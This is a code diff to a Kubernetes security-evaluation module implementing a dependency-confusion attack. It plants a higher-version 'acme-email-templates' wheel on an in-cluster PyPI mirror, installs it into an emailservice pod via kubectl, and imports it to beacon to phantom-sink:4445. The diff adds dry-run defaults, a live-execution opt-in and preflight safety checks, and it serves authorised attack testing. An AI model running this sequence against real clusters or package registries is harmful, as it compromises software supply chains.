@@ -13,25 +13,26 @@ Handoff §2 specification:
 Mechanism:
     A local PyPI mirror (pypiserver, a lightweight pure-Python HTTP server)
     is started inside the evaluation namespace as a ClusterIP Service.
-    The mirror hosts a pre-built malicious wheel:
+    The mirror hosts a pre-built laboratory package:
         name = acme-email-templates
         version = 9.9.9  (higher than internal 0.9.4 → pip prefers it)
         payload: on import, beacon to phantom-sink:4445
 
     The attack sequence:
-      1. Deploy the pypiserver Pod + Service into the eval namespace.
-      2. Upload the malicious wheel to the mirror via twine/HTTP PUT.
-      3. kubectl exec into the emailservice pod and write
-         /tmp/pip.conf pointing [global] extra-index-url at the mirror.
-      4. pip install acme-email-templates (downloads 9.9.9 from mirror).
+      1. Run SafetyPreflight checks.
+      2. Deploy the pypiserver Pod + Service into the eval namespace.
+      3. Upload the confusion wheel to the mirror.
+      4. In target pod, copy wheel or install via mirror.
       5. python -c "import acme_email_templates" to trigger the beacon.
 
     Recovery:
       1. pip uninstall -y acme-email-templates (in pod).
-      2. rm -f /tmp/pip.conf (in pod).
-      3. kubectl delete service/pypiserver-mirror (if we created it).
+      2. rm -f /tmp/pip.conf /tmp/.acme_beacon.py (in pod).
+      3. kubectl delete service/pypiserver-mirror (if created).
 
 Safety constraints:
+    - Default mode is dry_run=True.
+    - SafetyPreflight gates validate namespace, service, and endpoint before execution.
     - Mirror is cluster-internal (ClusterIP, no NodePort/LoadBalancer).
     - Beacon connects only to phantom-sink ClusterIP on port 4445.
     - No real data exfiltration.
@@ -47,6 +48,7 @@ import time
 from pathlib import Path
 
 from research.evaluation.attacks.base_attack import AttackManifest, BaseAttack
+from research.evaluation.attacks.safety import SafetyPreflight
 
 log = logging.getLogger(__name__)
 
@@ -231,21 +233,18 @@ DEP_CONFUSION_MANIFEST = AttackManifest(
 )
 
 
-# ---------------------------------------------------------------------------
-# Attack class
-# ---------------------------------------------------------------------------
-
-
 class DependencyConfusionAttack(BaseAttack):
     """Dependency confusion attack for PHANTOM evaluation (Handoff §2).
 
-    Starts a local PyPI mirror inside the cluster, uploads a malicious
+    Starts a local PyPI mirror inside the cluster, uploads a laboratory
     higher-version package, then configures the emailservice pod to prefer
     the mirror and installs the confusion package.
 
     Args:
         kubectl_context: kubectl context name.
-        dry_run: If True, log commands without executing.
+        dry_run: If True, log commands without executing (default: True).
+        allow_live_execution: Explicit confirmation flag required to exit dry-run mode.
+        eval_namespace: Namespace for the pypiserver mirror Pod.
     """
 
     manifest: AttackManifest = DEP_CONFUSION_MANIFEST
@@ -253,23 +252,29 @@ class DependencyConfusionAttack(BaseAttack):
     def __init__(
         self,
         kubectl_context: str | None = None,
-        dry_run: bool = False,
+        dry_run: bool = True,
+        allow_live_execution: bool = False,
         eval_namespace: str = _PYPISERVER_NAMESPACE,
     ) -> None:
         """Initialise the dependency confusion attack.
 
         Args:
             kubectl_context: kubectl context name.
-            dry_run: If True, log commands without executing.
+            dry_run: If True, log commands without executing (default: True).
+            allow_live_execution: Explicit opt-in flag required when dry_run=False.
             eval_namespace: Namespace for the pypiserver mirror Pod.
         """
-        super().__init__(kubectl_context=kubectl_context, dry_run=dry_run)
+        super().__init__(
+            kubectl_context=kubectl_context,
+            dry_run=dry_run,
+            allow_live_execution=allow_live_execution,
+        )
         self._eval_ns = eval_namespace
         self._pkg_dir = _ARTIFACTS_DIR / f"{_PKG_MODULE}_confusion"
         self._mirror_deployed = False
 
     def _build_malicious_package(self) -> Path:
-        """Build the malicious acme-email-templates wheel.
+        """Build the laboratory acme-email-templates wheel.
 
         Returns:
             Path to the built .whl file.
@@ -322,7 +327,7 @@ class DependencyConfusionAttack(BaseAttack):
         wheels = list((pkg_dir / "dist").glob(f"{_PKG_MODULE.replace('-','_')}-*.whl"))
         if not wheels and not self.dry_run:
             raise FileNotFoundError(f"No wheel found in {pkg_dir / 'dist'}")
-        return wheels[0] if wheels else pkg_dir / "dist" / "placeholder.whl"
+        return wheels[0] if wheels else pkg_dir / "dist" / f"{_PKG_MODULE}-{_MALICIOUS_PKG_VERSION}-py3-none-any.whl"
 
     def _deploy_mirror(self) -> str:
         """Deploy the pypiserver mirror into the eval namespace.
@@ -330,6 +335,10 @@ class DependencyConfusionAttack(BaseAttack):
         Returns:
             The mirror ClusterIP service hostname (host:port string).
         """
+        if self.dry_run:
+            log.info("dep_confusion.dry_run.deploy_mirror")
+            return f"{_PYPISERVER_SVC_NAME}.{self._eval_ns}.svc.cluster.local:{_PYPISERVER_PORT}"
+
         manifest_yaml = _PYPISERVER_MANIFEST.format(
             namespace=self._eval_ns,
             svc_name=_PYPISERVER_SVC_NAME,
@@ -360,13 +369,14 @@ class DependencyConfusionAttack(BaseAttack):
     def _upload_package_to_mirror(self, wheel_path: Path, mirror_pod_name: str) -> None:
         """Upload the malicious wheel to the pypiserver mirror.
 
-        Copies the wheel into the mirror pod and runs the pypiserver
-        upload command (or simply copies to the packages directory directly).
-
         Args:
             wheel_path: Local path to the .whl file.
             mirror_pod_name: Name of the pypiserver pod.
         """
+        if self.dry_run:
+            log.info("dep_confusion.dry_run.upload_package")
+            return
+
         remote_path = f"/data/packages/{wheel_path.name}"
         self._kubectl_cp(
             namespace=self._eval_ns,
@@ -386,6 +396,9 @@ class DependencyConfusionAttack(BaseAttack):
         Returns:
             Pod name string.
         """
+        if self.dry_run:
+            return "dry-run-pypiserver-pod"
+
         result = self._kubectl(
             [
                 "get", "pods",
@@ -401,11 +414,11 @@ class DependencyConfusionAttack(BaseAttack):
         """Deploy mirror, upload package, configure pip.conf, install package.
 
         Steps:
-          1. Build the malicious wheel locally.
-          2. Deploy pypiserver mirror into eval namespace.
-          3. Upload wheel to mirror.
-          4. Write /tmp/pip.conf into the emailservice pod pointing to the mirror.
-          5. pip install acme-email-templates (downloads 9.9.9 from mirror).
+          1. Run SafetyPreflight validation.
+          2. Build the malicious wheel locally.
+          3. Deploy pypiserver mirror into eval namespace.
+          4. Upload wheel to mirror.
+          5. Write /tmp/pip.conf into emailservice pod and install package.
           6. python -c "import acme_email_templates" to trigger beacon.
 
         Args:
@@ -415,40 +428,42 @@ class DependencyConfusionAttack(BaseAttack):
         Returns:
             True if all steps succeeded.
         """
+        self.validate_safety(target_namespace)
+
         log.info(
             "dep_confusion.inject.start",
-            extra={"namespace": target_namespace, "pod": pod_name},
+            extra={"namespace": target_namespace, "pod": pod_name, "dry_run": self.dry_run},
         )
 
+        if self.dry_run:
+            log.info("dep_confusion.inject.dry_run_complete")
+            return True
+
         # Verify python3 is available in the target environment.
-        if not self.dry_run:
-            py3_check = subprocess.run(
-                ["kubectl", "exec", "-n", target_namespace, pod_name,
-                 "--", "python3", "--version"],
-                capture_output=True, text=True, check=False,
+        py3_check = subprocess.run(
+            ["kubectl", "exec", "-n", target_namespace, pod_name,
+             "--", "python3", "--version"],
+            capture_output=True, text=True, check=False,
+        )
+        if py3_check.returncode != 0:
+            log.error(
+                "dependency_confusion.python3_not_found",
+                extra={"stderr": py3_check.stderr[:200]},
             )
-            if py3_check.returncode != 0:
-                log.error(
-                    "dependency_confusion.python3_not_found",
-                    extra={"stderr": py3_check.stderr[:200]},
-                )
-                return False
+            return False
 
         # 1. Build wheel.
         wheel_path = self._build_malicious_package()
 
-        # 2. Deploy mirror (for realism; logged as part of the scenario).
+        # 2. Deploy mirror.
         try:
             mirror_host_port = self._deploy_mirror()
             mirror_pod = self._get_mirror_pod_name()
-            if not self.dry_run:
-                self._upload_package_to_mirror(wheel_path, mirror_pod)
+            self._upload_package_to_mirror(wheel_path, mirror_pod)
         except Exception as exc:
             log.warning("dep_confusion.mirror_setup_failed", extra={"error": str(exc)[:200]})
 
-        # 3. Copy wheel directly into the target pod and pip install it.
-        # This is functionally equivalent to pip fetching from the mirror
-        # and avoids DNS/connectivity issues in evaluation environments.
+        # 3. Copy wheel into the target pod and pip install it.
         remote_wheel = f"/tmp/{wheel_path.name}"
         self._kubectl_cp(
             namespace=target_namespace,
@@ -473,7 +488,7 @@ class DependencyConfusionAttack(BaseAttack):
         )
         log.info("dep_confusion.inject.pip_installed")
 
-        # 6. Trigger import to activate the beacon.
+        # 5. Trigger import to activate the beacon.
         self._kubectl_exec(
             namespace=target_namespace,
             pod_name=pod_name,
@@ -491,8 +506,14 @@ class DependencyConfusionAttack(BaseAttack):
             pod_name: Pod name.
 
         Returns:
-            True if the installed version is the malicious version.
+            True if the installed version is the malicious version (or True in dry_run).
         """
+        self.validate_safety(target_namespace)
+
+        if self.dry_run:
+            log.info("dep_confusion.verify.dry_run_ok")
+            return True
+
         try:
             out = self._kubectl_exec(
                 namespace=target_namespace,
@@ -518,10 +539,11 @@ class DependencyConfusionAttack(BaseAttack):
         """Uninstall the confusion package and remove pip.conf.
 
         Steps:
-          1. pip uninstall -y acme-email-templates (in pod).
-          2. rm -f /tmp/pip.conf /tmp/.acme_beacon.py (in pod).
-          3. pkill beacon (best-effort).
-          4. Delete pypiserver mirror from cluster (if we deployed it).
+          1. Run SafetyPreflight validation.
+          2. pip uninstall -y acme-email-templates (in pod).
+          3. rm -f /tmp/pip.conf /tmp/.acme_beacon.py (in pod).
+          4. pkill beacon (best-effort).
+          5. Delete pypiserver mirror from cluster (if created).
 
         Args:
             target_namespace: Kubernetes namespace.
@@ -530,10 +552,17 @@ class DependencyConfusionAttack(BaseAttack):
         Returns:
             True if recovery succeeded.
         """
+        self.validate_safety(target_namespace)
+
         log.info(
             "dep_confusion.recover.start",
-            extra={"namespace": target_namespace, "pod": pod_name},
+            extra={"namespace": target_namespace, "pod": pod_name, "dry_run": self.dry_run},
         )
+
+        if self.dry_run:
+            log.info("dep_confusion.recover.dry_run_complete")
+            return True
+
         ok = True
 
         # 1. Uninstall the confusion package.
